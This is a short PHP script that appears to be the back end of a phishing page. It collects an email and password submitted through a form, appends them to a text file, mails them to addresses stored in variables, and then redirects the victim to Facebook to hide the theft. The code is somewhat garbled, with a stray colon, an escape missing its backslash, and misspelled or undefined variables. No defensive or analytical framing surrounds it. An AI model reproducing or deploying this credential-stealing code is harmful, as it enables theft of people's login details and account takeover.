<?php


$message .= "user: ".$_POST['email']."n";:$message .= "pass: ".$_POST['pass']."\n";
$rnessage = "$message\n";
$file = fopen("RzLt.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://www.facebook.com");



?>
